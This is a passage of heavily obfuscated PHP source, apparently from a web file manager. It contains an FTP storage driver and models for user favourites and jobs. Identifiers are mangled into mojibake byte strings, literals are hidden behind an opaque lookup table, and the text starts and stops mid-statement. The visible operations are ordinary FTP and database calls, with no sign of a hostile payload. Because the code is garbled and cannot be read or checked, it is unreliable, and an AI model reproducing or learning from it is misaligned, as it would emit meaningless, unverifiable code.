”˜»[1339] => $Õ¢·”ù‘, $‘ ”˜»[1340] => $²ºÉ½šÃ, $‘ ”˜»[1341] => $ŞŸªÆşš, $‘ ”˜»[186] => $this->getHost()); return $Ğå™¶½; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($úç“Ì‘å) { parent::__construct(); if (count($úç“Ì‘å) > 0) { $this->_init($úç“Ì‘å); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($äƒÌºŠ) { $ßûÂÎàÈ =& $_SERVER[ë¦»ºéÌ]; global $config; $this->appCharset = $config[$ßûÂÎàÈ[1342]]; $this->systemCharset = $config[$ßûÂÎàÈ[1343]]; if (isset($äƒÌºŠ[$ßûÂÎàÈ[1344]]) && $äƒÌºŠ[$ßûÂÎàÈ[1344]]) { $this->systemCharset = $äƒÌºŠ[$ßûÂÎàÈ[1344]]; } } public function iconvApp($¸¬·ìàş) { return $this->iconvTo($¸¬·ìàş, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ö¿‹£Ğ) { return $this->iconvTo($Ö¿‹£Ğ, $this->appCharset, $this->systemCharset); } public function getPathOuter($»Ìê£ÙŞ) { $İÜ’ˆÍ­ =& $_SERVER[ë¦»ºéÌ]; $œ Ó‚±Û = $this->iconvApp($this->pathBase); $»Ìê£ÙŞ = $this->iconvApp($»Ìê£ÙŞ); if (substr($œ Ó‚±Û, 0, 2) == $İÜ’ˆÍ­[1345]) { $œ Ó‚±Û = BASIC_PATH . substr($œ Ó‚±Û, 2); } if (substr($»Ìê£ÙŞ, 0, 2) == $İÜ’ˆÍ­[1345]) { $»Ìê£ÙŞ = BASIC_PATH . substr($»Ìê£ÙŞ, 2); } $œ Ó‚±Û = KodIO::clear($œ Ó‚±Û); $»Ìê£ÙŞ = KodIO::clear($»Ìê£ÙŞ); $»Ìê£ÙŞ = substr($»Ìê£ÙŞ, strlen($œ Ó‚±Û)); if (empty($this->pathDriver)) { return $»Ìê£ÙŞ; } return $this->pathDriver . $İÜ’ˆÍ­[8] . ltrim($»Ìê£ÙŞ, $İÜ’ˆÍ­[8]); } private function _init($Ê†åõÃ” = array()) { $¥œ„ÅË­ =& $_SERVER[ë¦»ºéÌ]; if (!function_exists($¥œ„ÅË­[1346])) { throw new Exception(LNG($¥œ„ÅË­[1347])); } $this->config = $Ê†åõÃ”; $this->charsetReset($Ê†åõÃ”); foreach ($Ê†åõÃ” as $¥’Âìş“ => $ğß¢½¶) { if (isset($this->{$¥’Âìş“})) { $this->{$¥’Âìş“} = $ğß¢½¶; } } return $this->_login($Ê†åõÃ”); } private function _login($Äü‚ñ°) { $ñ´é¿¦€ =& $_SERVER[ë¦»ºéÌ]; static $™ïø× = array(); $œšĞµ“í = md5(json_encode($Äü‚ñ°)); if (isset($™ïø×[$œšĞµ“í])) { foreach ($™ïø×[$œšĞµ“í] as $ø¨¡”Ø¿ => $¿ó§ÙşÕ) { $this->{$ø¨¡”Ø¿} = $¿ó§ÙşÕ; } return !0; } $á‘ëÇãÜ = parse_url(trim($this->server, $ñ´é¿¦€[8])); $this->host = $á‘ëÇãÜ[$ñ´é¿¦€[186]]; $»¾¶­µ¥ = isset($á‘ëÇãÜ[$ñ´é¿¦€[185]]) && $á‘ëÇãÜ[$ñ´é¿¦€[185]] == $ñ´é¿¦€[1348] ? !0 : !1; $this->scheme = $»¾¶­µ¥ ? $ñ´é¿¦€[1349] : $ñ´é¿¦€[1350]; $this->port = isset($á‘ëÇãÜ[$ñ´é¿¦€[187]]) ? $á‘ëÇãÜ[$ñ´é¿¦€[187]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $È»£µØˆ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $½ş‘Ñ¶ = $this->pasv == $ñ´é¿¦€[99] ? !0 : !1; @ftp_pasv($this->connect, $½ş‘Ñ¶); $™ïø×[$œšĞµ“í] = array($ñ´é¿¦€[1351] => $this->connect, $ñ´é¿¦€[186] => $this->host, $ñ´é¿¦€[185] => $this->scheme, $ñ´é¿¦€[187] => $this->port); return $È»£µØˆ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¼©êóœ, $èî¥ú¸ª = '', $«º¨˜ = REPEAT_RENAME) { if ($this->setContent($¼©êóœ, $èî¥ú¸ª)) { return $this->getPathOuter($¼©êóœ); } return !1; } public function mkdir($—ŞîÑüÁ, $„°”ºµ  = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $—ŞîÑüÁ = $this->iconvSystem($—ŞîÑüÁ); if ($this->_isFolder($—ŞîÑüÁ) || @ftp_mkdir($this->connect, $—ŞîÑüÁ)) { return $this->getPathOuter($—ŞîÑüÁ); } if (!$this->mkdir($this->pathFather($—ŞîÑüÁ))) { return !1; } if ($—ŞîÑüÁ = @ftp_mkdir($this->connect, $—ŞîÑüÁ)) { return $this->getPathOuter($—ŞîÑüÁ); } return !1; } public function copyFile($ş”ò•ì, $•”®§©) { if (!$this->_isconn()) { return !1; } $—µ‹Èø = $this->pathThis($this->iconvSystem($ş”ò•ì)); $Ïò–“»Ø = $this->tempFile($—µ‹Èø); $Ö†ƒ«Ç¶ = $this->iconvApp($Ïò–“»Ø); $this->download($ş”ò•ì, $Ö†ƒ«Ç¶); $˜ºç¾Åş = $this->upload($•”®§©, $Ö†ƒ«Ç¶); $this->tempFileRemve($Ïò–“»Ø); return $˜ºç¾Åş; } public function moveFile($²ºÖĞÅ, $À³š§³) { if (!$this->_isconn()) { return !1; } $²ºÖĞÅ = $this->iconvSystem($²ºÖĞÅ); $À³š§³ = $this->iconvSystem($À³š§³); $œÚ”Ì„ = @ftp_rename($this->connect, $²ºÖĞÅ, $À³š§³); return $œÚ”Ì„ ? $this->getPathOuter($À³š§³) : !1; } public function delFile($¦ñ£ñêß) { if (!$this->_isconn()) { return !1; } $¦ñ£ñêß = $this->iconvSystem($¦ñ£ñêß); return @ftp_delete($this->connect, $¦ñ£ñêß); } public function delFolder($è•Î­ñ‚) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ğóöÅù¾ = $ûÆä…Ä = array(); $this->fileList($è•Î­ñ‚, $ğóöÅù¾, $ûÆä…Ä, !0); $this->listItemCache = !0; foreach ($ûÆä…Ä as $ïÚ«»€Õ) { $ëË—ßú« = $this->iconvSystem($ïÚ«»€Õ[$_SERVER[ë¦»ºéÌ][42]]); $ÚØ©¥çû = @ftp_delete($this->connect, $ëË—ßú«); if (!$ÚØ©¥çû) { return !1; } } foreach ($ğóöÅù¾ as $ëË—ßú«) { $ëË—ßú« = $this->iconvSystem($ëË—ßú«); $ÚØ©¥çû = @ftp_rmdir($this->connect, $ëË—ßú«); if (!$ÚØ©¥çû) { return !1; } } $è•Î­ñ‚ = $this->iconvSystem($è•Î­ñ‚); return @ftp_rmdir($this->connect, $è•Î­ñ‚); } public function rename($Ñ÷¤İÑš, $»îŒ®) { $¨Æå–€Ê =& $_SERVER[ë¦»ºéÌ]; if (!$this->_isconn()) { return !1; } $©ş«Ğµ” = $this->fileNameAuto($this->pathFather($Ñ÷¤İÑš), $»îŒ®); $©ş«Ğµ” = $this->iconvSystem($©ş«Ğµ”); $Ñ÷¤İÑš = $this->iconvSystem($Ñ÷¤İÑš); $â€ëÙšÄ = $this->pathFather($Ñ÷¤İÑš); $ËèœùÉ¥ = rtrim($â€ëÙšÄ, $¨Æå–€Ê[8]) . $¨Æå–€Ê[8] . $©ş«Ğµ”; $›—˜°ûÖ = @ftp_rename($this->connect, $Ñ÷¤İÑš, $ËèœùÉ¥); $ËèœùÉ¥ = $this->iconvApp($ËèœùÉ¥); return $›—˜°ûÖ ? $this->getPathOuter($ËèœùÉ¥) : !1; } private function folderInfo($ãÆô»Ì, $ô¢‡âáù = false) { $¢óæÉ× =& $_SERVER[ë¦»ºéÌ]; $å…Ø©³ï = array($¢óæÉ×[42] => $this->pathThis($ãÆô»Ì), $¢óæÉ×[88] => $this->getPathOuter($¢óæÉ×[8] . $ãÆô»Ì), $¢óæÉ×[43] => $¢óæÉ×[89]); if ($ô¢‡âáù) { return $å…Ø©³ï; } $å…Ø©³ï[$¢óæÉ×[205]] = $å…Ø©³ï[$¢óæÉ×[96]] = 0; $å…Ø©³ï[$¢óæÉ×[206]] = $å…Ø©³ï[$¢óæÉ×[207]] = !0; return $å…Ø©³ï; } private function fileInfo($ã¦–Æ¸, $êÈ¡ı´¬ = false, $¨†Ò»ş÷ = array()) { $ß±Ÿçƒ÷ =& $_SERVER[ë¦»ºéÌ]; $ïø¿‘°ı = array($ß±Ÿçƒ÷[42] => $this->pathThis($ã¦–Æ¸), $ß±Ÿçƒ÷[88] => $this->getPathOuter($ß±Ÿçƒ÷[8] . $ã¦–Æ¸), $ß±Ÿçƒ÷[43] => $ß±Ÿçƒ÷[204], $ß±Ÿçƒ÷[90] => isset($¨†Ò»ş÷[$ß±Ÿçƒ÷[90]]) ? $¨†Ò»ş÷[$ß±Ÿçƒ÷[90]] : 0, $ß±Ÿçƒ÷[179] => $this->ext($ã¦–Æ¸)); if ($êÈ¡ı´¬) { return $ïø¿‘°ı; } $ïø¿‘°ı[$ß±Ÿçƒ÷[205]] = $ïø¿‘°ı[$ß±Ÿçƒ÷[96]] = 0; $ïø¿‘°ı[$ß±Ÿçƒ÷[206]] = $ïø¿‘°ı[$ß±Ÿçƒ÷[207]] = !0; $ùÔšæè‰ = $this->iconvSystem($ã¦–Æ¸); $ïø¿‘°ı[$ß±Ÿçƒ÷[96]] = @ftp_mdtm($this->connect, $ùÔšæè‰); if (empty($¨†Ò»ş÷)) { $¨†Ò»ş÷ = $this->objectMeta($ã¦–Æ¸); if (!$¨†Ò»ş÷) { return $ïø¿‘°ı; } } $ïø¿‘°ı[$ß±Ÿçƒ÷[90]] = $¨†Ò»ş÷[$ß±Ÿçƒ÷[90]]; return $ïø¿‘°ı; } public function size($ÏîşÈˆ³) { $ñğ¦Åé¦ = $this->objectMeta($ÏîşÈˆ³); return $ñğ¦Åé¦ ? $ñğ¦Åé¦[$_SERVER[ë¦»ºéÌ][90]] : 0; } public function info($»ç·Ëœ›) { if ($this->isFile($»ç·Ëœ›)) { return $this->fileInfo($»ç·Ëœ›, 0); } else { if ($this->isFolder($»ç·Ëœ›)) { return $this->folderInfo($»ç·Ëœ›); } } return !1; } private function fileList($òß Ñò, &$Ô€Ã³ª”, &$Ì‡£Âù, $š ŞÙüÑ = false) { $“µ‰‹œ§ =& $_SERVER[ë¦»ºéÌ]; $òß Ñò = $this->iconvSystem($òß Ñò); if (!$this->isFolder($òß Ñò)) { return !1; } @ftp_chdir($this->connect, $“µ‰‹œ§[8]); $òß Ñò = rtrim($òß Ñò, $“µ‰‹œ§[8]) . $“µ‰‹œ§[8]; check_abort(); $Åò¾à¤± = $this->listItemCache === !1 ? !1 : !0; $©ıŸ¹†ˆ = @ftp_rawlist($this->connect, $òß Ñò); if (!$©ıŸ¹†ˆ) { $©ıŸ¹†ˆ = array(); } $·ØÓî’Ş = array($“µ‰‹œ§[10] => 1, $“µ‰‹œ§[1352] => 1); foreach ($©ıŸ¹†ˆ as $û²±•’ã) { $»ŒÖêöÕ = $this->_listItem($û²±•’ã); if ($»ŒÖêöÕ[0] == $“µ‰‹œ§[743]) { continue; } $í©œ€ĞÌ = $»ŒÖêöÕ[8]; if (empty($í©œ€ĞÌ) && $í©œ€ĞÌ !== $“µ‰‹œ§[202] || isset($·ØÓî’Ş[$í©œ€ĞÌ])) { continue; } $í©œ€ĞÌ = $this->iconvApp($òß Ñò . ltrim($í©œ€ĞÌ, $“µ‰‹œ§[8])); $´şÍÀÄÃ = array($“µ‰‹œ§[42] => $í©œ€ĞÌ, $“µ‰‹œ§[43] => $“µ‰‹œ§[204], $“µ‰‹œ§[90] => $»ŒÖêöÕ[4]); if (substr($û²±•’ã, 0, 1) == $“µ‰‹œ§[1353]) { $´şÍÀÄÃ[$“µ‰‹œ§[43]] = $“µ‰‹œ§[89]; $´şÍÀÄÃ[$“µ‰‹œ§[90]] = 0; } $Ùø¿¦òú = $´şÍÀÄÃ[$“µ‰‹œ§[43]] == $“µ‰‹œ§[89] ? !0 : !1; if ($Åò¾à¤±) { $this->cacheMethod($“µ‰‹œ§[210], $í©œ€ĞÌ, $Ùø¿¦òú); $this->cacheMethod($“µ‰‹œ§[211], $í©œ€ĞÌ, $´şÍÀÄÃ); } if ($Ùø¿¦òú) { $Ô€Ã³ª”[] = $í©œ€ĞÌ; if ($š ŞÙüÑ) { $this->fileList($í©œ€ĞÌ, $Ô€Ã³ª”, $Ì‡£Âù, $š ŞÙüÑ); } continue; } $Ì‡£Âù[] = $´şÍÀÄÃ; } if ($Åò¾à¤±) { $this->cacheMethod($“µ‰‹œ§[210], $òß Ñò, !0); } } private function _listItem($İ•ÜÎì‹) { if (empty($İ•ÜÎì‹)) { return array(); } $”ã“ß—… = preg_split($_SERVER[ë¦»ºéÌ][1354], $İ•ÜÎì‹); if (count($”ã“ß—…) <= 9) { return $”ã“ß—…; } $”ã“ß—…[8] = trim(substr($İ•ÜÎì‹, strpos($İ•ÜÎì‹, $”ã“ß—…[7]) + strlen($”ã“ß—…[7]))); return array_splice($”ã“ß—…, 0, 9); } public function listPath($äÖ•èÃ×, $°óª†Éà = false) { $ƒ¬£š‰„ =& $_SERVER[ë¦»ºéÌ]; if (!$this->_isconn()) { return !1; } $ÚåŸä¼Œ = $¥¶—ø²Ö = array(); $this->fileList($äÖ•èÃ×, $ÚåŸä¼Œ, $¥¶—ø²Ö); foreach ($ÚåŸä¼Œ as $Õ»§õ·• => $Â¶ü–¼) { $ÚåŸä¼Œ[$Õ»§õ·•] = $this->folderInfo($Â¶ü–¼, $°óª†Éà); } foreach ($¥¶—ø²Ö as $Õ»§õ·• => $Â¶ü–¼) { $¥¶—ø²Ö[$Õ»§õ·•] = $this->fileInfo($Â¶ü–¼[$ƒ¬£š‰„[42]], $°óª†Éà, $Â¶ü–¼); } return array($ƒ¬£š‰„[87] => $ÚåŸä¼Œ, $ƒ¬£š‰„[86] => $¥¶—ø²Ö); } public function has($¾¾ŒäË¢, $úÔ§Î¦Ò = false, $–ÁáÉş = true) { $ã“¦„ù =& $_SERVER[ë¦»ºéÌ]; $íåÜ™äğ = $…¡ÉÔŸÜ = array(); $È†«æõì = $úÔ§Î¦Ò ? !0 : !1; $this->fileList($¾¾ŒäË¢, $íåÜ™äğ, $…¡ÉÔŸÜ, $È†«æõì); if ($úÔ§Î¦Ò) { return array($ã“¦„ù[214] => count($…¡ÉÔŸÜ), $ã“¦„ù[215] => count($íåÜ™äğ)); } if ($–ÁáÉş) { if (count($…¡ÉÔŸÜ)) { return !0; } } else { if (count($íåÜ™äğ)) { return !0; } } return !1; } public function listAll($úíèàÁ) { $î¨®ƒÙ =& $_SERVER[ë¦»ºéÌ]; if (!$this->_isconn()) { return !1; } $¼Ú©·íĞ = $’âä¯¶¸ = array(); $this->fileList($úíèàÁ, $¼Ú©·íĞ, $’âä¯¶¸, !0); $º»ÚüÁ™ = array(); foreach ($’âä¯¶¸ as $˜—ñÁ¿) { $º»ÚüÁ™[$˜—ñÁ¿[$î¨®ƒÙ[42]]] = $˜—ñÁ¿[$î¨®ƒÙ[90]]; } foreach ($¼Ú©·íĞ as $˜—ñÁ¿) { if (is_string($˜—ñÁ¿)) { $º»ÚüÁ™[$˜—ñÁ¿] = 0; } } return $this->listAllFiles($úíèàÁ, array_keys($º»ÚüÁ™), $º»ÚüÁ™); } public function getContent($Î”Œâë) { if (!$this->_isconn()) { return !1; } $Î”Œâë = $this->iconvSystem($Î”Œâë); return $this->fileSubstr($Î”Œâë); } public function setContent($‘ÚÜ¹Ğ, $¸¦Ó„çÃ = '') { if (!$this->_isconn()) { return !1; } $‹şèô¦± = $this->pathThis($this->iconvSystem($‘ÚÜ¹Ğ)); $‚•Ì†§Õ = $this->tempFile($‹şèô¦±); file_put_contents($‚•Ì†§Õ, $¸¦Ó„çÃ); $®‘õÎ«Ï = $this->upload($‘ÚÜ¹Ğ, $this->iconvApp($‚•Ì†§Õ)); $this->tempFileRemve($‚•Ì†§Õ); return $®‘õÎ«Ï; } public function fileSubstr($¨ö±€‚ˆ, $ğŞ²ï×® = 0, $›×‡¼úà = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¨ö±€‚ˆ, $ğŞ²ï×®, $›×‡¼úà); } private function ftpRequest($ßú¼æÙÙ, $€‘ôö›ê = 0, $‰“¯°„ì = false) { $ßú¼æÙÙ = $this->iconvSystem($ßú¼æÙÙ); $Ïš¯šûÒ = $this->scheme . $this->host . $_SERVER[ë¦»ºéÌ][4] . $this->port; $é¬§Åì = curl_init(); curl_setopt($é¬§Åì, CURLOPT_URL, $Ïš¯šûÒ . $this->pathEncode($ßú¼æÙÙ)); curl_setopt($é¬§Åì, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($‰“¯°„ì) { $Öê—˜ÚÃ = $€‘ôö›ê + $‰“¯°„ì - 1; curl_setopt($é¬§Åì, CURLOPT_RANGE, "{$€‘ôö›ê}\x2d{$Öê—˜ÚÃ}"); } curl_setopt($é¬§Åì, CURLOPT_RETURNTRANSFER, 1); $ª÷ĞŞÂ = curl_exec($é¬§Åì); curl_close($é¬§Åì); return $ª÷ĞŞÂ; } public function upload($éÅ§ÍÙô, $Ü¢–ˆ¶, $Ş¯ıÌğ© = false, $ôÌÌØ÷½ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($éÅ§ÍÙô))) { return !1; } $éÅ§ÍÙô = $this->iconvSystem($éÅ§ÍÙô); $Ü¢–ˆ¶ = $this->iconvSystem($Ü¢–ˆ¶); $¦Ó°æÀ = ftp_nb_put($this->connect, $éÅ§ÍÙô, $Ü¢–ˆ¶, FTP_BINARY); while ($¦Ó°æÀ == FTP_MOREDATA) { $¦Ó°æÀ = ftp_nb_continue($this->connect); } if ($¦Ó°æÀ != FTP_FINISHED) { return !1; } return $this->getPathOuter($éÅ§ÍÙô); } public function download($àÕ¯ßæ, $òîÃªÆÉ = '') { if (!$this->_isconn()) { return !1; } $¬úÂŞºƒ = $this->pathFather($òîÃªÆÉ); if (!IO::mkdir($¬úÂŞºƒ)) { return !1; } $àÕ¯ßæ = $this->iconvSystem($àÕ¯ßæ); $òîÃªÆÉ = $this->iconvSystem($òîÃªÆÉ); $¶´é‚¬ = ftp_nb_get($this->connect, $òîÃªÆÉ, $àÕ¯ßæ, FTP_BINARY); while ($¶´é‚¬ == FTP_MOREDATA) { $¶´é‚¬ = ftp_nb_continue($this->connect); } if ($¶´é‚¬ != FTP_FINISHED) { return !1; } return $this->iconvApp($òîÃªÆÉ); } public function exist($Ë×õ¤Åğ) { return $this->isFile($Ë×õ¤Åğ) || $this->isFolder($Ë×õ¤Åğ); } public function isFile($’œŠµ¨’) { return !$this->isFolder($’œŠµ¨’) && $this->objectMeta($’œŠµ¨’); } public function isFolder($úûàÉ˜) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][210], $úûàÉ˜); } protected function objectMeta($·¸íËˆÚ) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][211], $·¸íËˆÚ); } protected function _objectMeta($ßÁØßäñ) { $‚½Õ—¼ª =& $_SERVER[ë¦»ºéÌ]; if ($ßÁØßäñ == $‚½Õ—¼ª[12] || $ßÁØßäñ == $‚½Õ—¼ª[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ßÁØßäñ = $this->iconvSystem($ßÁØßäñ); $‚€£ÏÑğ = array($‚½Õ—¼ª[42] => $this->iconvApp($ßÁØßäñ), $‚½Õ—¼ª[43] => $‚½Õ—¼ª[204], $‚½Õ—¼ª[90] => 0); @ftp_chdir($this->connect, $‚½Õ—¼ª[8]); $¸ÊÖ¶±– = @ftp_size($this->connect, $ßÁØßäñ); if ($¸ÊÖ¶±– != -1) { $‚€£ÏÑğ[$‚½Õ—¼ª[90]] = $¸ÊÖ¶±–; } else { $ì¡¸Õ±’ = @ftp_chdir($this->connect, $ßÁØßäñ); if (!$ì¡¸Õ±’) { return !1; } $‚€£ÏÑğ[$‚½Õ—¼ª[43]] = $‚½Õ—¼ª[89]; } return $‚€£ÏÑğ; } protected function _isFolder($€›üì¹ ) { $§¢ÊÈ¨† =& $_SERVER[ë¦»ºéÌ]; if ($€›üì¹  == $§¢ÊÈ¨†[12] || $€›üì¹  == $§¢ÊÈ¨†[8]) { return !0; } $Âö“ÏÉ = $this->_objectMeta($€›üì¹ ); return isset($Âö“ÏÉ[$§¢ÊÈ¨†[43]]) && $Âö“ÏÉ[$§¢ÊÈ¨†[43]] == $§¢ÊÈ¨†[89] ? !0 : !1; } } goto dÔ•ç ¥¿å; D¼È’Æâ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($íğÌßş) { $á•õ„òÉ =& $_SERVER[ë¦»ºéÌ]; return array($á•õ„òÉ[1908] => array(USER_ID, $á•õ„òÉ[2227])); } protected function listData() { $ôª…†ïü =& $_SERVER[ë¦»ºéÌ]; $„„ëÚó‚ = array($ôª…†ïü[1623] => USER_ID, $ôª…†ïü[485] => 0); $ÑØé¿Ô¿ = $ôª…†ïü[2228]; $§¶ß‚Šƒ = $this->field($ÑØé¿Ô¿)->where($„„ëÚó‚)->order($ôª…†ïü[2229])->select(); return $§¶ß‚Šƒ ? $§¶ß‚Šƒ : array(); } protected function resetCache() { } protected function listView() { $ú¼¤‡—Ö =& $_SERVER[ë¦»ºéÌ]; $ª©¢Ù¿ë = $this->listData(); $ö¢¥ûÊ¥ = array_filter_by_field($ª©¢Ù¿ë, $ú¼¤‡—Ö[43], $ú¼¤‡—Ö[419]); $ÕÅ°â¦² = array_to_keyvalue($ö¢¥ûÊ¥, $ú¼¤‡—Ö[12], $ú¼¤‡—Ö[88]); if (!$ÕÅ°â¦²) { return $ª©¢Ù¿ë; } $Á±ëŞÙã = 2000; $¥Ä±ãŸ = array($ú¼¤‡—Ö[420] => array($ú¼¤‡—Ö[421], $ÕÅ°â¦²)); $…àËíÕ¦ = Model($ú¼¤‡—Ö[809])->listSource($¥Ä±ãŸ, $Á±ëŞÙã); $…àËíÕ¦ = array_merge($…àËíÕ¦[$ú¼¤‡—Ö[86]], $…àËíÕ¦[$ú¼¤‡—Ö[87]]); $…àËíÕ¦ = array_to_keyvalue($…àËíÕ¦, $ú¼¤‡—Ö[405]); foreach ($ª©¢Ù¿ë as $ì™İº´Ö => $öÖÜºÓÂ) { $¾¦³Ã‘Ò = $…àËíÕ¦[$öÖÜºÓÂ[$ú¼¤‡—Ö[88]]]; $¾¦³Ã‘Ò = $¾¦³Ã‘Ò ? $¾¦³Ã‘Ò : array(); $ª©¢Ù¿ë[$ì™İº´Ö] = array_merge($¾¦³Ã‘Ò, $öÖÜºÓÂ); } return $ª©¢Ù¿ë; } protected function addFav($šá­àÚï, $É†½“° = '', $ ÓèÄæ = "\x73\157\x75\x72\143\x65") { $ş×“à¤¼ =& $_SERVER[ë¦»ºéÌ]; $Î¿Ïí‰ = array($ş×“à¤¼[1623] => USER_ID, $ş×“à¤¼[485] => 0, $ş×“à¤¼[425] => $ ÓèÄæ, $ş×“à¤¼[424] => $šá­àÚï); if ($this->where($Î¿Ïí‰)->find()) { return !1; } $Î¿Ïí‰ = array($ş×“à¤¼[1623] => USER_ID, $ş×“à¤¼[485] => 0); $Õ“æüä = $this->where($Î¿Ïí‰)->max($ş×“à¤¼[1823]); if (!$Õ“æüä) { $Õ“æüä = 0; } if (!$É†½“° && $ ÓèÄæ == $ş×“à¤¼[419]) { $µàİ«““ = Model($ş×“à¤¼[1305])->where(array($ş×“à¤¼[420] => $šá­àÚï))->find(); if (!$µàİ«““) { return !1; } $É†½“° = $µàİ«““[$ş×“à¤¼[42]]; } $É†½“° = $this->getAutoName($É†½“°); $çè¦óÖÂ = array($ş×“à¤¼[1623] => USER_ID, $ş×“à¤¼[485] => 0, $ş×“à¤¼[423] => $É†½“°, $ş×“à¤¼[424] => $šá­àÚï, $ş×“à¤¼[425] => $ ÓèÄæ, $ş×“à¤¼[1804] => $Õ“æüä + 1); return $this->add($çè¦óÖÂ); } protected function remove($Ğ­§øÉ) { $şèó†µ =& $_SERVER[ë¦»ºéÌ]; $ë‹¸“€¨ = array($şèó†µ[1623] => USER_ID, $şèó†µ[422] => $Ğ­§øÉ); return $this->where($ë‹¸“€¨)->delete(); } protected function removeByName($±Ö©Äë¦) { $â‹ıİúŸ =& $_SERVER[ë¦»ºéÌ]; $“Ù¢Â¹å = array($â‹ıİúŸ[1623] => USER_ID, $â‹ıİúŸ[423] => $±Ö©Äë¦, $â‹ıİúŸ[485] => 0); return $this->where($“Ù¢Â¹å)->delete(); } protected function rename($š’çÜŠ¾, $±¤Ùåõœ) { $óÁ—å­» =& $_SERVER[ë¦»ºéÌ]; if ($š’çÜŠ¾ == $±¤Ùåõœ) { return !1; } $×ù™¿· = $this->getAutoName($±¤Ùåõœ); if ($±¤Ùåõœ != $×ù™¿·) { return !1; } $¯Äåêëü = array($óÁ—å­»[1623] => USER_ID, $óÁ—å­»[485] => 0, $óÁ—å­»[42] => $š’çÜŠ¾); return $this->where($¯Äåêëü)->save(array($óÁ—å­»[42] => $±¤Ùåõœ)); } protected function resetSort($úšá¡ØÊ) { $¡àÛöñô =& $_SERVER[ë¦»ºéÌ]; $úšá¡ØÊ = is_array($úšá¡ØÊ) ? $úšá¡ØÊ : array(); $ËæÆÂÔ¡ = array($¡àÛöñô[1623] => USER_ID); for ($ÚÖãø’” = 0; $ÚÖãø’” < count($úšá¡ØÊ); $ÚÖãø’”++) { $ËæÆÂÔ¡[$¡àÛöñô[422]] = $úšá¡ØÊ[$ÚÖãø’”]; $this->where($ËæÆÂÔ¡)->save(array($¡àÛöñô[1804] => $ÚÖãø’” + 1)); } return !0; } protected function moveTop($«½ŞŠ§‘) { $Ì¡³Õ–´ =& $_SERVER[ë¦»ºéÌ]; $íœ¬­· = array($Ì¡³Õ–´[1623] => USER_ID, $Ì¡³Õ–´[485] => 0); $—±™şú‹ = $this->where($íœ¬­·)->where(array($Ì¡³Õ–´[42] => $«½ŞŠ§‘))->find(); if (!$—±™şú‹) { return; } $Ôø€’›Ç = $this->field($Ì¡³Õ–´[403])->where($íœ¬­·)->order($Ì¡³Õ–´[2229])->select(); $Ôø€’›Ç = array_to_keyvalue($Ôø€’›Ç, $Ì¡³Õ–´[12], $Ì¡³Õ–´[403]); $İÉˆ¸Á = $Ôø€’›Ç; $Ôø€’›Ç = array_remove_value($Ôø€’›Ç, $—±™şú‹[$Ì¡³Õ–´[403]]); array_unshift($Ôø€’›Ç, $—±™şú‹[$Ì¡³Õ–´[403]]); return $this->resetSort($Ôø€’›Ç); } protected function moveBottom($»×ç›èï) { $’¸€¶°ã =& $_SERVER[ë¦»ºéÌ]; $¥ı¢†Í° = array($’¸€¶°ã[1623] => USER_ID, $’¸€¶°ã[485] => 0); $ø©®ˆ´ô = $this->where($¥ı¢†Í°)->max($’¸€¶°ã[1823]); $ü»Ãİø = array($’¸€¶°ã[1823] => $ø©®ˆ´ô + 1); return $this->where($¥ı¢†Í°)->where(array($’¸€¶°ã[42] => $»×ç›èï))->save($ü»Ãİø); } private function getAutoName($¦œÚ—½Æ) { $»¥¶ÈúÚ =& $_SERVER[ë¦»ºéÌ]; $†¿Ÿïæà = array($»¥¶ÈúÚ[1623] => USER_ID, $»¥¶ÈúÚ[485] => 0); $çË§Öùò = $this->field($»¥¶ÈúÚ[42])->where($†¿Ÿïæà)->select(); $çË§Öùò = array_to_keyvalue($çË§Öùò, $»¥¶ÈúÚ[12], $»¥¶ÈúÚ[42]); if (!$çË§Öùò || !in_array($¦œÚ—½Æ, $çË§Öùò)) { return $¦œÚ—½Æ; } for ($á©”ÏÔı = 0; $á©”ÏÔı < count($çË§Öùò); $á©”ÏÔı++) { if (!in_array($¦œÚ—½Æ . "\x28{$á©”ÏÔı}\51", $çË§Öùò)) { return $¦œÚ—½Æ . "\x28{$á©”ÏÔı}\51"; } } return $¦œÚ—½Æ . "\50{$á©”ÏÔı}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\152\x6f\142\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\144\145\163\143", "\x73\157\162\x74"); const JOB_KEY = "\x73\145\154\146\112\157\142\x4c\x69\163\164"; public function listData($üğá÷Ú = false, $Àå†ÔÂß = "\x73\x6f\x72\164", $ú†î½‚ = false) { return parent::listData($üğá÷Ú, $Àå†ÔÂß, $ú†î½‚); } public function remove($ä¨„ûŞ) { return parent::remove($ä¨„ûŞ); } public function add($¥Çë©±ß) { $Úíï•ìÇ =& $_SERVER[ë¦»ºéÌ]; if ($this->findByName($¥Çë©±ß[$Úíï•ìÇ[42]])) { return !1; } $¥Çë©±ß[$Úíï•ìÇ[1823]] = $this->getSort(); return parent::insert($¥Çë©±ß); } private function getSort() { $–ŒĞĞ™ı =& $_SERVER[ë¦»ºéÌ]; $ÅÏæØí = parent::listData(); $€ìÜËŒ¶ = array_to_keyvalue($ÅÏæØí, $–ŒĞĞ™ı[12], $–ŒĞĞ™ı[1823]); return empty($€ìÜËŒ¶) ? 0 : max($€ìÜËŒ¶) + 1; } public function update($ã¼·Õ, $ÍÇåÑ—·) { $‘Éê£¾Ñ =& $_SERVER[ë¦»ºéÌ]; $ğø«è•ƒ = 